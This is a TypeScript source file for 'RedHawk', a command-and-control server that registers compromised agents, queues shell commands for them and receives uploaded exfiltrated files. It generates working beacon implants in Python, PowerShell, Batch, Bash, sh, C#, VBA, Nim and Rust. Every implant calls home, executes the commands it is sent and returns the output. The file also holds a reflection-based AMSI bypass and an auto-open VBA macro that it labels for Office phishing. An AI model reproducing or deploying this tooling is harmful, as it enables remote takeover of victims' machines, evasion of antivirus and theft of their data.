/**
 * RedHawk — C2 Server (Command & Control)
 *
 * A lightweight HTTP/HTTPS C2 server that:
 *   - Listens for agent callbacks (HTTP POST)
 *   - Registers and tracks agents
 *   - Queues commands for agents
 *   - Collects task results
 *   - Provides a REST API + WebSocket for the UI
 *
 * Agent protocol:
 *   POST /c2/checkin  — agent heartbeat & command fetch
 *   POST /c2/result   — agent posts task output
 *   POST /c2/upload   — agent uploads exfiltrated files
 *   GET  /c2/poll     — agent polls for new tasks (long-poll fallback)
 */

import * as http from 'http';
import * as https from 'https';
import * as fs from 'fs';
import * as path from 'path';
import * as url from 'url';
import { EventEmitter } from 'events';
import { CollabHub } from './collab-hub';
import type { ProfileManager } from './profile-manager';

export interface C2Agent {
  id: string;
  hostname: string;
  username: string;
  os: string;
  ip: string;
  firstSeen: string;
  lastCheckin: string;
  status: 'online' | 'offline' | 'dead';
  tasks: C2Task[];
}

export interface C2Task {
  id: string;
  agentId: string;
  command: string;
  status: 'queued' | 'sent' | 'completed' | 'failed';
  result: string | null;
  createdAt: string;
  completedAt: string | null;
}

export interface C2Config {
  listenHost: string;
  listenPort: number;
  sslCert?: string;
  sslKey?: string;
  useHttps: boolean;
  killDate: string;
  jitter: number;
  userAgent: string;
  profileName: string;
}

const DEFAULT_CONFIG: C2Config = {
  listenHost: '0.0.0.0',
  listenPort: 8080,
  useHttps: false,
  killDate: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(), // 30 days
  jitter: 3,
  userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
  profileName: 'default',
};

export class C2Server extends EventEmitter {
  private config: C2Config;
  private server: http.Server | https.Server | null = null;
  private agents: Map<string, C2Agent> = new Map();
  private tasks: Map<string, C2Task> = new Map();
  private running = false;
  private pollClients: Map<string, any[]> = new Map(); // agentId -> response queue
  collabHub: CollabHub | null = null;
  private profileManager: ProfileManager | null = null;
  private resolvedProfile: any = null;

  constructor(config: Partial<C2Config> = {}) {
    super();
    this.config = { ...DEFAULT_CONFIG, ...config };
  }

  setProfileManager(pm: ProfileManager) {
    this.profileManager = pm;
    this.resolveProfile();
  }

  private resolveProfile() {
    if (!this.profileManager) return;
    this.resolvedProfile = this.profileManager.resolve(this.config.profileName, {
      http: {
        jitter: this.config.jitter,
        sleep: this.config.killDate ? 10 : 5,
        userAgent: this.config.userAgent,
      } as any,
    });
  }

  attachCollab(hub: CollabHub) {
    this.collabHub = hub;
  }

  start(): Promise<boolean> {
    return new Promise((resolve) => {
      if (this.running) {
        resolve(true);
        return;
      }

      const handler = this.handleRequest.bind(this);

      if (this.config.useHttps && this.config.sslCert && this.config.sslKey) {
        try {
          const options = {
            cert: fs.readFileSync(this.config.sslCert),
            key: fs.readFileSync(this.config.sslKey),
          };
          this.server = https.createServer(options, handler);
        } catch (err: any) {
          this.emit('error', `SSL setup failed: ${err.message}`);
          resolve(false);
          return;
        }
      } else {
        this.server = http.createServer(handler);
      }

      this.server.listen(this.config.listenPort, this.config.listenHost, () => {
        this.running = true;
        this.emit('started', {
          host: this.config.listenHost,
          port: this.config.listenPort,
          https: this.config.useHttps,
        });
        resolve(true);
      });

      this.server.on('error', (err: Error) => {
        this.running = false;
        this.emit('error', err.message);
        resolve(false);
      });
    });
  }

  stop(): void {
    if (this.server) {
      this.server.close();
      this.server = null;
    }
    this.running = false;
    this.emit('stopped');
  }

  isRunning(): boolean {
    return this.running;
  }

  getConfig(): C2Config {
    return { ...this.config };
  }

  updateConfig(updates: Partial<C2Config>): void {
    this.config = { ...this.config, ...updates };
  }

  getAgents(): C2Agent[] {
    return Array.from(this.agents.values()).map((a) => ({
      ...a,
      tasks: a.tasks.slice(-10), // Only last 10 tasks for listing
    }));
  }

  getAgent(id: string): C2Agent | undefined {
    return this.agents.get(id);
  }

  getTasks(agentId?: string): C2Task[] {
    if (agentId) {
      return Array.from(this.tasks.values()).filter((t) => t.agentId === agentId);
    }
    return Array.from(this.tasks.values());
  }

  /**
   * Queue a command for a specific agent
   */
  queueCommand(agentId: string, command: string): C2Task | null {
    const agent = this.agents.get(agentId);
    if (!agent) return null;

    const task: C2Task = {
      id: `task_${Date.now()}_${Math.random().toString(36).slice(2, 8)}`,
      agentId,
      command,
      status: 'queued',
      result: null,
      createdAt: new Date().toISOString(),
      completedAt: null,
    };

    this.tasks.set(task.id, task);
    agent.tasks.push(task);

    this.emit('taskQueued', task);
    return task;
  }

  /**
   * Queue a command for ALL online agents
   */
  broadcastCommand(command: string): C2Task[] {
    const tasks: C2Task[] = [];
    for (const [id, agent] of this.agents) {
      if (agent.status === 'online') {
        const task = this.queueCommand(id, command);
        if (task) tasks.push(task);
      }
    }
    return tasks;
  }

  /**
   * Generate agent payload for various target environments
   * @param agentType - target runtime (python, powershell, powershell-amsi, batch, bash, sh, csharp, vba, nim, rust)
   * @param sleepSeconds - base sleep interval in seconds between check-ins (default: 5)
   * @param jitterPercent - random jitter as percentage of sleep (default: 30)
   * @param killDate - ISO date string after which the agent stops (default: never)
   */
  generateAgentPayload(agentType: string, sleepSeconds: number = 5, jitterPercent: number = 30, killDate?: string): string {
    const host = this.config.listenHost === '0.0.0.0' ? '127.0.0.1' : this.config.listenHost;
    const proto = this.config.useHttps ? 'https' : 'http';
    const serverUrl = `${proto}://${host}:${this.config.listenPort}`;
    const sleepMin = Math.max(1, Math.round(sleepSeconds * (1 - jitterPercent / 100)));
    const sleepMax = Math.round(sleepSeconds * (1 + jitterPercent / 100));
    const killDateLine = killDate
      ? `\nif ([DateTime]::UtcNow -gt [DateTime]::Parse('${killDate}')) { exit }`
      : '';
    // Epoch timestamp for Python kill date check
    const killEpoch = killDate ? Math.floor(new Date(killDate).getTime() / 1000) : 0;

    // Profile-based URIs (fallback to default /c2/ paths)
    const checkinUri = this.profileUri('get');
    const resultUri = this.profileUri('post');
    const uploadUri = this.profileUri('upload');

    // Wrap the switch result so we can post-process URIs
    const raw = (() => {
      switch (agentType) {

      // ── Python Beacon (with jitter, kill date, proper task IDs) ──
      default:
      case 'python': return `
import urllib.request, urllib.parse, json, socket, subprocess, sys, time, uuid, random
C2_URL="${serverUrl}";AID=uuid.uuid4().hex[:8];HN=socket.gethostname();U=subprocess.check_output('whoami',shell=True).decode().strip();O=sys.platform
SLEEP_MIN=${sleepMin};SLEEP_MAX=${sleepMax}${killDate ? `;KILL_EPOCH=${killEpoch}` : ''}
while 1:
 try:${killDate ? '\n  if time.time() > KILL_EPOCH: break' : ''}
  d=json.dumps({"id":AID,"hostname":HN,"username":U,"os":O}).encode()
  r=json.loads(urllib.request.urlopen(urllib.request.Request(f"{C2_URL}/c2/checkin",data=d,headers={"Content-Type":"application/json"},method="POST"),timeout=30).read().decode())
  if r.get("task")and r["task"].get("command"):
   try: o=subprocess.check_output(r["task"]["command"],shell=True,stderr=subprocess.STDOUT,timeout=60).decode()
   except Exception as e: o=str(e)
   urllib.request.urlopen(f"{C2_URL}/c2/result",data=json.dumps({"taskId":r["task"]["id"],"agentId":AID,"output":o,"status":"completed"}).encode(),headers={"Content-Type":"application/json"})
  time.sleep(random.uniform(SLEEP_MIN,SLEEP_MAX))
 except: time.sleep(random.uniform(SLEEP_MIN,SLEEP_MAX))
`.trim();

      // ── PowerShell Beacon (with jitter, kill date, proper task IDs) ──
      case 'powershell': return `
# RedHawk C2 Beacon — PowerShell
# Generated for: ${serverUrl}
# Sleep: ${sleepSeconds}s ±${jitterPercent}% (${sleepMin}-${sleepMax}s)
# Kill date: ${killDate || 'none'}
$c="${serverUrl}"
$id=[System.Guid]::NewGuid().ToString().Substring(0,8)
$sleepMin=${sleepMin};$sleepMax=${sleepMax}
while($true){${killDateLine}
  try{
    $b=@{id=$id;hostname=$(hostname);username=$(whoami);os=((Get-CimInstance Win32_OperatingSystem).Caption)}|ConvertTo-Json
    $r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json" -TimeoutSec 30
    if($r.task -and $r.task.command){
      try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
      $null=Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json" -TimeoutSec 30
    }
  }catch{}
  $j=[math]::Floor((Get-Random -Minimum 0 -Maximum 1000)/1000*($sleepMax-$sleepMin)+$sleepMin)
  Start-Sleep -Seconds $j
}`.trim();

      // ── PowerShell Beacon (AMSI-bypassed, with jitter) ──
      case 'powershell-amsi': return `
# RedHawk C2 Beacon — PowerShell (AMSI Bypassed)
# Generated for: ${serverUrl}
# Sleep: ${sleepSeconds}s ±${jitterPercent}% (${sleepMin}-${sleepMax}s)
# Kill date: ${killDate || 'none'}
# AMSI bypass via reflection
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
$c="${serverUrl}"
$id=[System.Guid]::NewGuid().ToString().Substring(0,8)
$sleepMin=${sleepMin};$sleepMax=${sleepMax}
while($true){${killDateLine}
  try{
    $b=@{id=$id;hostname=$(hostname);username=$(whoami);os=((Get-CimInstance Win32_OperatingSystem).Caption)}|ConvertTo-Json
    $r=Invoke-RestMethod -Uri "$c/c2/checkin" -Method POST -Body $b -ContentType "application/json" -TimeoutSec 30
    if($r.task -and $r.task.command){
      try{$o=Invoke-Expression $r.task.command 2>&1|Out-String}catch{$o=$_.Exception.Message}
      $null=Invoke-RestMethod -Uri "$c/c2/result" -Method POST -Body (@{taskId=$r.task.id;agentId=$id;output=$o;status="completed"}|ConvertTo-Json) -ContentType "application/json" -TimeoutSec 30
    }
  }catch{}
  $j=[math]::Floor((Get-Random -Minimum 0 -Maximum 1000)/1000*($sleepMax-$sleepMin)+$sleepMin)
  Start-Sleep -Seconds $j
}`.trim();

      // ── Batch (.bat / CMD) ──
      case 'batch': return `@echo off
REM RedHawk C2 Beacon — Batch
REM Generated for: ${serverUrl}
REM Sleep: ${sleepSeconds}s ±${jitterPercent}%
set "C2=${serverUrl}"
set "ID=%RANDOM%%RANDOM%"
set "SLEEP_MIN=${sleepMin}"
set "SLEEP_MAX=${sleepMax}"
:loop
for /f "tokens=*" %%a in ('hostname') do set "HN=%%a"
for /f "tokens=*" %%b in ('whoami') do set "U=%%b"
${killDate ? `REM Kill date: ${killDate}` : ''}
REM Check-in
curl -s -X POST "%C2%/c2/checkin" -H "Content-Type: application/json" -d "{\\"id\\":\\"%ID%\\",\\"hostname\\":\\"%HN%\\",\\"username\\":\\"%U%\\",\\"os\\":\\"Windows\\"}" > %TEMP%\\c2_resp.json 2>nul
if exist %TEMP%\\c2_resp.json (
  findstr /C:"command" %TEMP%\\c2_resp.json >nul && (
    for /f "tokens=*" %%c in ('python -c "import json;d=json.load(open('%TEMP%\\\\c2_resp.json'));t=d.get('task',{});print(t.get('id','0'));print(t.get('command',''))" 2^>nul') do set "TASK_ID=%%c" && goto :got_task
    :got_task
    for /f "tokens=*" %%d in ('python -c "import json;d=json.load(open('%TEMP%\\\\c2_resp.json'));print(d.get('task',{}).get('command',''))" 2^>nul') do set "CMD=%%d"
    if defined CMD (
      for /f "tokens=*" %%o in ('%CMD% 2^>^&1') do set "OUT=%%o"
      curl -s -X POST "%C2%/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"%TASK_ID%\\",\\"agentId\\":\\"%ID%\\",\\"output\\":\\"%OUT%\\",\\"status\\":\\"completed\\"}" >nul 2>nul
    )
  )
  del %TEMP%\\c2_resp.json 2>nul
)
REM Jitter sleep
set /a "JITTER=%RANDOM% %% (%SLEEP_MAX% - %SLEEP_MIN% + 1) + %SLEEP_MIN%"
timeout /t %JITTER% /nobreak >nul
goto loop`.trim();

      // ── Bash / Unix Shell ──
      case 'bash': return `#!/bin/bash
# RedHawk C2 Beacon — Bash
# Generated for: ${serverUrl}
# Sleep: ${sleepSeconds}s ±${jitterPercent}%
C2="${serverUrl}"
ID=$(uuidgen 2>/dev/null || echo $RANDOM$$)
HN=$(hostname)
U=$(whoami)
O=$(uname -s)
SLEEP_MIN=${sleepMin}
SLEEP_MAX=${sleepMax}
${killDate ? `KILL_EPOCH=$(date -d '${killDate}' +%s 2>/dev/null || echo 0)` : ''}
while true; do
  ${killDate ? `[ -n "$KILL_EPOCH" ] && [ "$(date +%s)" -gt "$KILL_EPOCH" ] && exit 0` : ''}
  RESP=$(curl -s -X POST "$C2/c2/checkin" -H "Content-Type: application/json" -d "{\\"id\\":\\"$ID\\",\\"hostname\\":\\"$HN\\",\\"username\\":\\"$U\\",\\"os\\":\\"$O\\"}")
  TASK_ID=$(echo "$RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);t=d.get('task',{});print(t.get('id',''))" 2>/dev/null)
  CMD=$(echo "$RESP" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('task',{}).get('command',''))" 2>/dev/null)
  if [ -n "$CMD" ]; then
    OUTPUT=$(eval "$CMD" 2>&1)
    curl -s -X POST "$C2/c2/result" -H "Content-Type: application/json" -d "{\\"taskId\\":\\"$TASK_ID\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" >/dev/null
  fi
  JITTER=$(( RANDOM % (SLEEP_MAX - SLEEP_MIN + 1) + SLEEP_MIN ))
  sleep $JITTER
done`.trim();

      // ── Sh (BusyBox / embedded) ──
      case 'sh': return `#!/bin/sh
# RedHawk C2 Beacon — SH (BusyBox compatible)
# Generated for: ${serverUrl}
# Sleep: ${sleepSeconds}s ±${jitterPercent}%
C2="${serverUrl}"
ID=$$$(date +%s)
HN=$(hostname)
U=$(whoami)
O=$(uname -o 2>/dev/null || uname -s)
SLEEP_MIN=${sleepMin}
SLEEP_MAX=${sleepMax}
while true; do
  RESP=$(wget -q -O- --post-data="{\\"id\\":\\"$ID\\",\\"hostname\\":\\"$HN\\",\\"username\\":\\"$U\\",\\"os\\":\\"$O\\"}" --header="Content-Type: application/json" "$C2/c2/checkin" 2>/dev/null)
  TASK_ID=$(echo "$RESP" | sed 's/.*"id":"\\([^"]*\\)".*/\\1/')
  CMD=$(echo "$RESP" | sed 's/.*"command":"\\([^"]*\\)".*/\\1/')
  if [ -n "$CMD" ] && [ "$CMD" != "$RESP" ]; then
    OUTPUT=$(eval "$CMD" 2>&1)
    wget -q -O- --post-data="{\\"taskId\\":\\"$TASK_ID\\",\\"agentId\\":\\"$ID\\",\\"output\\":\\"$OUTPUT\\",\\"status\\":\\"completed\\"}" --header="Content-Type: application/json" "$C2/c2/result" >/dev/null 2>&1
  fi
  JITTER=$(awk "BEGIN{srand();print int(rand()*($SLEEP_MAX-$SLEEP_MIN+1))+$SLEEP_MIN}" 2>/dev/null || echo $SLEEP_MIN)
  sleep $JITTER
done`.trim();

      // ── C# (via csc.exe, .NET Framework on Windows) ──
      case 'csharp': return `
// RedHawk C2 Agent — C# (compile with: csc.exe agent.cs)
// Requires .NET Framework (Windows)
using System;
using System.Net;
using System.Diagnostics;
using System.Text;
using System.Threading;
class Agent {
  static void Main() {
    string c2 = "${serverUrl}";
    string id = Guid.NewGuid().ToString().Substring(0,8);
    string hn = Environment.MachineName;
    string un = Environment.UserName;
    using(var wc = new WebClient()) {
      wc.Headers[HttpRequestHeader.ContentType] = "application/json";
      while(true) {
        try {
          string body = $"{{\\"id\\":\\"{id}\\",\\"hostname\\":\\"{hn}\\",\\"username\\":\\"{un}\\",\\"os\\":\\"Windows\\"}}";
          string resp = wc.UploadString($"{c2}/c2/checkin", "POST", body);
          // Quick JSON parse for task command
          int idx = resp.IndexOf("\\"command\\":\\"");
          if(idx > 0) {
            idx += 11;
            int end = resp.IndexOf("\\"", idx);
            string cmd = resp.Substring(idx, end - idx);
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) { RedirectStandardOutput = true, UseShellExecute = false };
            var p = Process.Start(psi);
            string output = p.StandardOutput.ReadToEnd();
            p.WaitForExit();
            string result = $"{{\\"taskId\\":\\"0\\",\\"agentId\\":\\"{id}\\",\\"output\\":\\"{output.Replace("\\"","\\\\\\"")}\\",\\"status\\":\\"completed\\"}}";
            wc.UploadString($"{c2}/c2/result", "POST", result);
          }
        } catch { }
        Thread.Sleep(5000);
      }
    }
  }
}`.trim();

      // ── VBA Macro (for Office phishing) ──
      case 'vba': return `' RedHawk C2 Agent — VBA Macro
' Paste into Office Document -> Developer -> Visual Basic -> ThisDocument
' Auto-open on document enable
Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" _
  Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, _
  ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Private Declare PtrSafe Function ShellExecute Lib "shell32.dll" _
  Alias "ShellExecuteA" (ByVal hwnd As Long, ByVal lpOperation As String, _
  ByVal lpFile As String, ByVal lpParameters As String, ByVal nShowCmd As Long) As Long

Sub AutoOpen()
  CheckIn
End Sub

Sub CheckIn()
  Dim c2 As String: c2 = "${serverUrl}"
  Dim id As String: id = Left(CreateObject("Scriptlet.TypeLib").Guid, 8)
  Dim http As Object: Set http = CreateObject("MSXML2.XMLHTTP")
  Dim json As String
  Dim cmd As String, output As String
  
  ' Check-in loop (runs while document is open)
  On Error Resume Next
  Do While True
    json = "{""id"":""" & id & """,""hostname"":""" & Environ("COMPUTERNAME") & """,""username"":""" & Environ("USERNAME") & """,""os"":""Windows""}"
    http.Open "POST", c2 & "/c2/checkin", False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send json
    
    If http.Status = 200 Then
      ' Crude command extraction
      Dim resp As String: resp = http.responseText
      Dim startP As Integer: startP = InStr(resp, """command"":""")
      If startP > 0 Then
        startP = startP + 11
        Dim endP As Integer: endP = InStr(startP, resp, """")
        cmd = Mid(resp, startP, endP - startP)
        output = CreateObject("WScript.Shell").Exec(cmd).StdOut.ReadAll
        json = "{""taskId"":""0"",""agentId"":""" & id & """,""output"":""" & Replace(output, """", """""") & """,""status"":""completed""}"
        http.Open "POST", c2 & "/c2/result", False
        http.setRequestHeader "Content-Type", "application/json"
        http.Send json
      End If
    End If
    Sleep 10000 ' 10 seconds
  Loop
End Sub

#If VBA7 Then
  Private Declare PtrSafe Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#Else
  Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
#End If`.trim();

      // ── Nim (compiled executable) ──
      case 'nim': return `# RedHawk C2 Agent — Nim
# Compile: nim c -d:ssl agent.nim
import httpclient, json, os, strutils, times, random, uri

let c2 = "${serverUrl}"
let agentId = random(999999).toHex(8)
let hostname = hostOS()
let username = getEnv("USER", "unknown")
let osInfo = hostOS()

proc checkin(): JsonNode =
  let body = %*{"id": agentId, "hostname": hostname, "username": username, "os": osInfo}
  try:
    let client = newHttpClient()
    let resp = client.post(c2 & "/c2/checkin", body=$body)
    result = parseJson(resp.body)
  except: result = %*{}

proc sendResult(taskId, output: string) =
  let body = %*{"taskId": taskId, "agentId": agentId, "output": output, "status": "completed"}
  try:
    let client = newHttpClient()
    discard client.post(c2 & "/c2/result", body=$body)
  except: discard

while true:
  let resp = checkin()
  if resp.hasKey("task") and resp["task"].hasKey("command"):
    let cmd = resp["task"]["command"].getStr()
    let output = execProcess(cmd).strip()
    sendResult("0", output)
  sleep(5000)`.trim();

      // ── Rust (compiled) ──
      case 'rust': return `// RedHawk C2 Agent — Rust
// Cargo.toml: [dependencies] reqwest = { version = "0.11", features = ["json", "blocking"] } serde_json = "1.0"
// Build: cargo build --release
use std::process::Command;
use std::thread::sleep;
use std::time::Duration;

fn main() {
    let c2 = "${serverUrl}";
    let agent_id = format!("{:08x}", std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos());
    let hostname = hostname::get().unwrap().to_string_lossy().to_string();
    let username = whoami::username();
    
    loop {
        let client = reqwest::blocking::Client::new();
        let checkin = serde_json::json!({"id": agent_id, "hostname": hostname, "username": username, "os": std::env::consts::OS});
        
        if let Ok(resp) = client.post(format!("{}/c2/checkin", c2)).json(&checkin).send() {
            if let Ok(data) = resp.json::<serde_json::Value>() {
                if let Some(task) = data.get("task") {
                    if let Some(cmd_str) = task.get("command").and_then(|c| c.as_str()) {
                        let output = if cfg!(target_os = "windows") {
                            Command::new("cmd").args(&["/C", cmd_str]).output()
                        } else {
                            Command::new("sh").args(&["-c", cmd_str]).output()
                        };
                        
                        let result_text = match output {
                            Ok(o) => String::from_utf8_lossy(&o.stdout).to_string(),
                            Err(e) => format!("Error: {}", e),
                        };
                        
                        let result = serde_json::json!({"taskId": "0", "agentId": agent_id, "output": result_text, "status": "completed"});
                        let _ = client.post(format!("{}/c2/result", c2)).json(&result).send();
                    }
                }
            }
        }
        sleep(Duration::from_secs(5));
    }
}`.trim();
    }
    })();
    // Post-process: replace hardcoded URIs with profile-based URIs
    return raw
      .replace(/\/c2\/checkin/g, checkinUri)
      .replace(/\/c2\/result/g, resultUri)
      .replace(/\/c2\/upload/g, uploadUri);
  }

  /**
   * Handle incoming HTTP requests
   */
  /** Get canonical profile URI — falls back to default paths */
  private profileUri(key: 'get' | 'post' | 'upload'): string {
    try {
      return this.resolvedProfile?.http?.[key]?.uri || `/c2/${key === 'get' ? 'checkin' : key === 'post' ? 'result' : 'upload'}`;
    } catch {
      return `/c2/${key === 'get' ? 'checkin' : key === 'post' ? 'result' : 'upload'}`;
    }
  }

  /** Apply profile response headers + status */
  private applyProfileResponse(key: 'get' | 'post' | 'upload', res: http.ServerResponse) {
    try {
      const ep = this.resolvedProfile?.http?.[key];
      if (ep?.response?.headers) {
        for (const h of ep.response.headers) {
          res.setHeader(h.name, h.value);
        }
      }
      // Always set CORS
      res.setHeader('Access-Control-Allow-Origin', '*');
    } catch {
      res.setHeader('Access-Control-Allow-Origin', '*');
    }
  }

  private handleRequest(req: http.IncomingMessage, res: http.ServerResponse) {
    const parsed = url.parse(req.url || '', true);
    const pathname = parsed.pathname;

    // CORS headers for Web UI
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PATCH, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') {
      res.writeHead(204);
      res.end();
      return;
    }

    // Resolve profile on every request (in case config changes)
    this.resolveProfile();

    // Parse body
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      try {
        const checkinUri = this.profileUri('get');
        const resultUri = this.profileUri('post');
        const uploadUri = this.profileUri('upload');

        if (pathname === checkinUri) {
          this.handleCheckin(body, res, req);
        } else if (pathname === resultUri) {
          this.handleResult(body, res);
        } else if (pathname === uploadUri) {
          this.handleUpload(req, body, res);
        } else if (pathname === '/c2/poll') {
          this.handlePoll(parsed.query, res);
        } else if (pathname?.startsWith('/api/')) {
          this.handleApi(pathname, parsed.query, body, req.method || 'GET', res);
        } else {
          res.writeHead(404, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: 'not found' }));
        }
      } catch (err: any) {
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: err.message }));
      }
    });
  }

  private handleCheckin(body: string, res: http.ServerResponse, req?: http.IncomingMessage) {
    const data = JSON.parse(body);
    const { id, hostname, username, os, ip } = data;

    if (!id) {
      res.writeHead(400);
      res.end(JSON.stringify({ error: 'missing agent id' }));
      return;
    }

    const now = new Date().toISOString();
    let agent = this.agents.get(id);

    if (!agent) {
      agent = {
        id,
        hostname: hostname || 'unknown',
        username: username || 'unknown',
        os: os || 'unknown',
        ip: ip || req?.socket?.remoteAddress || '',
        firstSeen: now,
        lastCheckin: now,
        status: 'online',
        tasks: [],
      };
      this.agents.set(id, agent);
      this.emit('newAgent', agent);
    } else {
      agent.lastCheckin = now;
      agent.status = 'online';
      agent.ip = ip || agent.ip;
      agent.hostname = hostname || agent.hostname;
      agent.username = username || agent.username;
      if (hostname) agent.hostname = hostname;
      this.emit('agentUpdate', agent);
    }

    // Find next queued task
    const nextTask = agent.tasks.find((t) => t.status === 'queued');
    const response: any = { status: 'ok', agentId: id };

    if (nextTask) {
      nextTask.status = 'sent';
      nextTask.completedAt = new Date().toISOString();
      response.task = { id: nextTask.id, command: nextTask.command };
      this.emit('taskSent', nextTask);
    }

    const getEp = this.resolvedProfile?.http?.get;
    const status = getEp?.response?.status || 200;
    res.writeHead(status, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify(response));
  }

  private handleResult(body: string, res: http.ServerResponse) {
    const data = JSON.parse(body);
    const { taskId, agentId, output, status } = data;

    const task = this.tasks.get(taskId);
    if (task) {
      task.status = status || 'completed';
      task.result = output || '';
      task.completedAt = new Date().toISOString();
      this.emit('taskResult', task);
    }

    this.applyProfileResponse('post', res);
    const postEp = this.resolvedProfile?.http?.post;
    const respStatus = postEp?.response?.status || 200;
    res.writeHead(respStatus, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok' }));
  }

  private handleUpload(req: http.IncomingMessage, body: string, res: http.ServerResponse) {
    try {
      const boundary = req.headers['content-type']?.split('boundary=')[1];
      if (boundary) {
        // Parse multipart — for simplicity, save raw
        const uploadDir = path.join(process.cwd(), 'c2_uploads');
        if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
        const filename = `upload_${Date.now()}.bin`;
        fs.writeFileSync(path.join(uploadDir, filename), body);
        this.emit('fileUploaded', { filename, size: body.length });
      } else {
        // JSON with base64
        const data = JSON.parse(body);
        if (data.filename && data.content) {
          const uploadDir = path.join(process.cwd(), 'c2_uploads');
          if (!fs.existsSync(uploadDir)) fs.mkdirSync(uploadDir, { recursive: true });
          const buffer = Buffer.from(data.content, 'base64');
          fs.writeFileSync(path.join(uploadDir, data.filename), buffer);
          this.emit('fileUploaded', { filename: data.filename, size: buffer.length });
        }
      }
    } catch (err: any) {
      this.emit('error', `Upload error: ${err.message}`);
    }

    this.applyProfileResponse('upload', res);
    const uploadEp = this.resolvedProfile?.http?.upload;
    const upStatus = uploadEp?.response?.status || 200;
    res.writeHead(upStatus, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ status: 'ok' }));
  }

  private handlePoll(query: any, res: http.ServerResponse) {
    const agentId = query.id as string;
    if (!agentId) {
      res.writeHead(400);
      res.end(JSON.stringify({ error: 'missing agent id' }));
      return;
    }

    const agent = this.agents.get(agentId);
    if (!agent) {
      res.writeHead(404);
      res.end(JSON.stringify({ error: 'agent not found' }));
      return;
    }

    // Long-poll: hold connection until a task is available or timeout
    const timeout = setTimeout(() => {
      if (this.pollClients.has(agentId)) {
        this.pollClients.set(agentId, (this.pollClients.get(agentId) || []).filter((r) => r !== res));
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'timeout' }));
      }
    }, 25000);

    const nextTask = agent.tasks.find((t) => t.status === 'queued');
    if (nextTask) {
      clearTimeout(timeout);
      nextTask.status = 'sent';
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ status: 'ok', task: { id: nextTask.id, command: nextTask.command } }));
      return;
    }

    // Hold connection
    if (!this.pollClients.has(agentId)) {
      this.pollClients.set(agentId, []);
    }
    this.pollClients.get(agentId)!.push({ res, timeout });
  }

  private handleApi(pathname: string, query: any, body: string, method: string, res: http.ServerResponse) {
    const respond = (data: any, code = 200) => {
      res.writeHead(code, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(data));
    };

    try {
      // Route collab requests to the hub
      if (pathname?.startsWith('/api/collab/') && this.collabHub) {
        const parsedBody = body ? JSON.parse(body) : {};
        const result = this.collabHub.handleApi(pathname, parsedBody, method);
        respond(result.data, result.status);
        return;
      }

      switch (pathname) {
        case '/api/status':
          respond({ running: this.running, agents: this.agents.size, tasks: this.tasks.size, config: this.config });
          break;

        case '/api/agents':
          respond(this.getAgents());
          break;

        case '/api/config':
          if (method === 'POST') {
            const updates = JSON.parse(body);
            this.updateConfig(updates);
            respond({ status: 'ok', config: this.config });
          } else {
            respond(this.config);
          }
          break;

        case '/api/tasks':
          respond(this.getTasks(query.agentId as string));
          break;

        default:
          respond({ error: 'unknown endpoint' }, 404);
      }
    } catch (err: any) {
      respond({ error: err.message }, 500);
    }
  }
}
